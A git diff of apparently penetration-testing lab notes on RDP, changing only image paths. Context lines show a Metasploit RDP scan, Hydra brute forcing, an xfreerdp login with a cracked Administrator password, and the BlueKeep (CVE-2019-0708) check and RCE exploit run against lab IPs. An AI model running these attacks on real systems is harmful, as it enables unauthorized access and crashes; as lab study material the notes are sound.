@@ -62,7 +62,7 @@ msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.0.17.61
 </strong>msf5 auxiliary(scanner/rdp/rdp_scanner) > run
 </code></pre>
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption><p>RDP Detected</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>RDP Detected</p></figcaption></figure>
 
 > The RDP is running on target port `3333`
 
@@ -100,7 +100,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-30 18:12:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 18:13:35
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * In this case, `freerdp` cannot be used in this lab, the only RDP client that can be used is `xfreerdp`.
 
@@ -108,11 +108,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-30 18:13:
 xfreerdp  /u:Administrator /p:qwertyuiop /v:10.0.17.61:3333
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <details>
 
@@ -172,7 +172,7 @@ PORT      STATE SERVICE            VERSION
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 > RDP port 3389 is opened.
 
@@ -186,7 +186,7 @@ msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RHOSTS 192.168.42.139
 msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > The target is vulnerable
 
@@ -200,7 +200,7 @@ msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.42.139
 msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > And boom it crashed&#x20;
 
